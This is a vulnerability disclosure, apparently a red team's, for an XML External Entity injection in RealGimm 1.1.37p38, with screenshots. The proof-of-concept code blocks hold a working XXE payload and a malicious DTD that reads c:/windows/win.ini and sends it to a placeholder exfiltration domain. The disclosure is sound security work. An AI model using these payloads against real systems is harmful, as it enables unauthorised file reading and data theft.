# CVE-ID | RealGimm by GruppoSCAI - XML External Entity Injection
An XML External Entity injection vunerability was found in RealGimm version 1.1.37p38. What follows is a description of the steps taken to perform the exploit.

## Proof of Concept
First of all, we access the function in which the vulnerability is present by clicking on *Gest. Tecnica -> Manutenzioni -> Scheda Visita/Manutenz. * and we click on the import icon:

![Import XML Functionality](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/d31fdfd0-63ef-4450-8d32-d90098de6232)

Below the file import window:

![File import window](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/9a29bcc2-934e-4b61-8ebb-edecca0e141a)


To demonstrate the presence of the vulnerability, we first create a file with the following content and import it using the functionality offered by the web application:

```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://[burp collaborator URL]"> %xxe; ]>
```
![File test.xml with payload](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/5d03b262-d80a-480c-88bb-7bbd1fe9234e)

![Import test.xml](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/72bf13ad-c62c-4435-a3c7-73152f753a5d)


Below the intercepted request and response:

![Request and response](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/29790c98-d650-4b4b-9d32-59af598df027)


As seen in the following image, the test.xml file containing the malicious payload is successfully parsed and a http request is issued to the burp collaborator domain:

![Request recevied in burp collaborator](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/513a3abc-574d-484b-ac4f-2487fb77be5e)


Using the vulnerability just described, it is also possible to read any file present on the file system where the xml parser is running. For this purpose, on our attacking machine, we define a malicious.dtd dtd file that allows exfiltrating the contents of file c:/windows/win.ini:

```
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://[exiltration domain]/?x=%file;'>">
%eval;
%exfiltrate;
```
![Malicious dtd file](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/7b78dcd3-cdba-4f94-b3dc-0160549fb14d)


We accordingly update the previously used test.xml file with the following content:
```
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://[exfiltration domain]/malicious.dtd"> %xxe; ]>
```
So let's import the test.xml file as we did previously.
![malicious test.xml](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/ae8646bd-0365-40d3-a0c4-c2403b3d91a8)
![test.xml import](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/04d3efae-6090-489a-8e60-eaeabf90e465)


As can be seen from the following image, from the web server logs, we can successfully exfiltrate the contents of the win.ini file:
![win.ini exfiltrated](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/69cffda1-8b57-4b92-8cd0-297f4296b946)


Below is the decoded content of the exfiltrated file:
![win.ini decoded](https://github.com/CapgeminiCisRedTeam/Disclosure/assets/132057950/b791a414-78ba-4507-a4e9-d1c129b92c52)

